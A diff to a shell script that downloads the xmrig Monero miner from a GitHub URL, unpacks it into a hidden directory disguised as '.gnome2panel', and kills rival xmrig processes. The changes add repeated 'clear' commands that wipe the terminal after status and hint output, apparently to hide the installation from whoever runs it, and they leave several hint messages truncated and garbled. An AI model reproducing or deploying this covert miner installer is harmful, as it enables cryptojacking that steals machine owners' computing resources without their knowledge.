@@ -141,13 +141,13 @@ killall -9 xmrig
 clear
 echo "[*] Removing  $HOME/.gnome2panel directory"
 rm -rf $HOME/.gnome2panel
-clear
+
 echo "[*] "
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
   exit 1
 fi
-clear
+
 echo "[*] "
 [ -d  $HOME/.gnome2panel ] || mkdir  $HOME/.gnome2panel
 if ! tar xf /tmp/xmrig.tar.gz -C  $HOME/.gnome2panel; then
@@ -286,21 +286,25 @@ EOL
 fi
 
 echo ""
-echo ""
+echo "NOTE: If you are usin"
+clear
 if [ "$CPU_THREADS" -lt "4" ]; then
-  echo "H"
+  echo "HINT: Please execute thege:"
+  clear
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
   echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
-clear
   if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
     echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    clear
   else
     echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    clear
   fi
 else
-  echo ""
+  echo "HINT: Please execute nt CPU usage:"
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \ $HOME/.gnome2panel/config.json"
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \ $HOME/.gnome2panel/config_background.json"
+  clear
 fi
 echo ""
 clear
@@ -308,6 +312,3 @@ clear
 clear
 
 echo "[*] Setup complete"
-
-
-
